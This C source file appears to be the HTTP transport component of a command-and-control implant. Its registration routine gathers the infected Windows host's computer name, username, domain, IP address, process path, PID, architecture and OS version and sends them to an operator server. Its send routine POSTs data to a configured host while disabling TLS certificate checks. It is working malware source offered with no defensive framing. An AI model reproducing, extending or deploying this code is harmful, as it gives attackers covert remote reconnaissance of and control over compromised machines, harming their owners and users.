#include <Revnt.h>

#include <Transport.h>
#include <Command.h>
#include <Core.h>

#include <iptypes.h>
#include <iphlpapi.h>
#include <winternl.h>
#include <winhttp.h>

#define DATA_FREE( d, l ) \
    memset( d, 0, l ); \
    LocalFree( d ); \
    d = NULL;

BOOL TransportInit( )
{
    PPACKAGE         Package    = NULL;
    BOOL             Success    = FALSE;
    PVOID            Data       = NULL;
    PIP_ADAPTER_INFO Adapter    = NULL;
    OSVERSIONINFOEXW OsVersions = { 0 };
    SIZE_T           Length     = 0;

    Package = PackageCreate( COMMAND_REGISTER );

    // Add data
    /*
        [ SIZE         ] 4 bytes
        [ Magic Value  ] 4 bytes
        [ Agent ID     ] 4 bytes
        [ COMMAND ID   ] 4 bytes
        [ Demon ID     ] 4 bytes
        [ User Name    ] size + bytes
        [ Host Name    ] size + bytes
        [ Domain       ] size + bytes
        [ IP Address   ] 16 bytes?
        [ Process Name ] size + bytes
        [ Process ID   ] 4 bytes
        [ Parent  PID  ] 4 bytes
        [ Process Arch ] 4 bytes
        [ Elevated     ] 4 bytes
        [ OS Info      ] ( 5 * 4 ) bytes
        [ OS Arch      ] 4 bytes
    */

    // Add AES Keys/IV
    // PackageAddPad( Package, Instance.Config.AES.Key, 32 );
    // PackageAddPad( Package, Instance.Config.AES.IV,  16 );

    // Add session id
    PackageAddInt32( Package, Instance.Session.AgentID );

    // Get Computer name
    if ( ! GetComputerNameExA( ComputerNameNetBIOS, NULL, &Length ) )
    {
        if ( ( Data = LocalAlloc( LPTR, Length ) ) )
            GetComputerNameExA( ComputerNameNetBIOS, Data, &Length );
    }
    PackageAddBytes( Package, Data, Length );
    DATA_FREE( Data, Length );

    // Get Username
    Length = MAX_PATH;
    if ( ( Data = LocalAlloc( LPTR, Length ) ) )
        GetUserNameA( Data, &Length );

    PackageAddBytes( Package, Data, strlen( Data ) );
    DATA_FREE( Data, Length );

    // Get Domain
    if ( ! GetComputerNameExA( ComputerNameDnsDomain, NULL, &Length ) )
    {
        if ( ( Data = LocalAlloc( LPTR, Length ) ) )
            GetComputerNameExA( ComputerNameDnsDomain, Data, &Length );
    }
    PackageAddBytes( Package, Data, Length );
    DATA_FREE( Data, Length );

    GetAdaptersInfo( NULL, &Length );
    if ( ( Adapter = LocalAlloc( LPTR, Length ) ) )
    {
        if ( GetAdaptersInfo( Adapter, &Length ) == NO_ERROR )
        {
            PackageAddBytes( Package, Adapter->IpAddressList.IpAddress.String, strlen( Adapter->IpAddressList.IpAddress.String ) );

            memset( Adapter, 0, Length );
            LocalFree( Adapter );
            Adapter = NULL;
        }
        else
            PackageAddInt32( Package, 0 );
    }
    else
        PackageAddInt32( Package, 0 );


    Length = MAX_PATH;
    if ( ( Data = LocalAlloc( LPTR, Length ) ) )
    {
        Length = GetModuleFileNameA( NULL, Data, Length );
        PackageAddBytes( Package, Data, Length );
    } else PackageAddInt32( Package, 0 );

    PackageAddInt32( Package, GetCurrentProcessId() );
    PackageAddInt32( Package, 0 );
    PackageAddInt32( Package, PROCESS_AGENT_ARCH );
    PackageAddInt32( Package, FALSE ); // default

    memset( &OsVersions, 0, sizeof( OsVersions ) );
    OsVersions.dwOSVersionInfoSize = sizeof( OsVersions );
    Instance.Win32.RtlGetVersion( &OsVersions );

    PackageAddInt32( Package, OsVersions.dwMajorVersion );
    PackageAddInt32( Package, OsVersions.dwMinorVersion );
    PackageAddInt32( Package, OsVersions.wProductType );
    PackageAddInt32( Package, OsVersions.wServicePackMajor );
    PackageAddInt32( Package, OsVersions.dwBuildNumber );

    PackageAddInt32( Package, Instance.Session.OSArch );
    PackageAddInt32( Package, Instance.Config.Sleeping );
    // End of Options

    if ( PackageTransmit( Package, &Data, &Length ) )
    {
        PRINT_HEX( Data, Length )

        if ( Data )
        {
            printf( "Agent => %x : %x\n", ( UINT32 ) DEREF( Data ), ( UINT32 ) Instance.Session.AgentID );
            if ( ( UINT32 ) Instance.Session.AgentID == ( UINT32 ) DEREF( Data ) )
            {
                Instance.Session.Connected = TRUE;
                Success = TRUE;
            }
        }
        else
        {
            Success = FALSE;
        }
    }

    return Success;
}

BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize )
{
    HANDLE  hConnect        = NULL;
    HANDLE  hSession        = NULL;
    HANDLE  hRequest        = NULL;
    LPWSTR  HttpEndpoint    = NULL;
    DWORD   HttpFlags       = 0;
    DWORD   HttpAccessType  = 0;
    LPCWSTR HttpProxy       = NULL;
    DWORD   BufRead         = 0;
    UCHAR   Buffer[ 1024 ]  = { 0 };
    PVOID   RespBuffer      = NULL;
    SIZE_T  RespSize        = 0;
    BOOL    Successful      = TRUE;

    hSession = WinHttpOpen( Instance.Config.Transport.UserAgent, HttpAccessType, HttpProxy, WINHTTP_NO_PROXY_BYPASS, 0 );
    if ( ! hSession )
    {
        printf( "WinHttpOpen: Failed => %d\n", GetLastError() );
        Successful = FALSE;
        goto LEAVE;
    }

    hConnect = WinHttpConnect( hSession, Instance.Config.Transport.Host, Instance.Config.Transport.Port, 0 );
    if ( ! hConnect )
    {
        printf( "WinHttpConnect: Failed => %d\n", GetLastError() );
        Successful = FALSE;
        goto LEAVE;
    }

    HttpEndpoint = L"index.php";
    HttpFlags    = WINHTTP_FLAG_BYPASS_PROXY_CACHE;

    if ( Instance.Config.Transport.Secure )
        HttpFlags |= WINHTTP_FLAG_SECURE;

    hRequest = WinHttpOpenRequest( hConnect, L"POST", HttpEndpoint, NULL, NULL, NULL, HttpFlags );
    if ( ! hRequest )
    {
        printf( "WinHttpOpenRequest: Failed => %d\n", GetLastError() );
        return FALSE;
    }

    if ( Instance.Config.Transport.Secure )
    {
        HttpFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA        |
                    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_CN_INVALID   |
                    SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

        if ( ! WinHttpSetOption( hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &HttpFlags, sizeof( DWORD ) ) )
        {
            printf( "WinHttpSetOption: Failed => %d\n", GetLastError() );
        }
    }

    // Send our data
    if ( WinHttpSendRequest(hRequest, NULL, 0, Data, Size, Size, (DWORD_PTR) NULL) )
    {
        if ( RecvData && WinHttpReceiveResponse( hRequest, NULL ) )
        {
            RespBuffer = NULL;
            do
            {
                Successful = WinHttpReadData( hRequest, Buffer, 1024, &BufRead );
                if ( ! Successful || BufRead == 0 )
                {
                    if ( ! Successful )
                        printf( "WinHttpReadData: Failed (%d)\n", GetLastError() );
                    break;
                }

                if ( ! RespBuffer )
                    RespBuffer = LocalAlloc( LPTR, BufRead );
                else
                    RespBuffer = LocalReAlloc( RespBuffer, RespSize + BufRead, LMEM_MOVEABLE | LMEM_ZEROINIT );

                RespSize += BufRead;

                memcpy( RespBuffer + ( RespSize - BufRead ), Buffer, BufRead );
                memset( Buffer, 0, 1024 );

            } while ( Successful == TRUE );

            if ( RecvSize )
                *RecvSize = RespSize;

            if ( RecvData )
                *RecvData = RespBuffer;

            Successful = TRUE;
        }
    }
    else
    {
        if ( GetLastError() == 12029 ) // ERROR_INTERNET_CANNOT_CONNECT
            Instance.Session.Connected = FALSE;
        else
            printf( "WinHttpSendRequest: Failed => %d\n", GetLastError() );

        Successful = FALSE;
        goto LEAVE;
    }


    LEAVE:
    WinHttpCloseHandle( hSession );
    WinHttpCloseHandle( hConnect );
    WinHttpCloseHandle( hRequest );

    return Successful;
}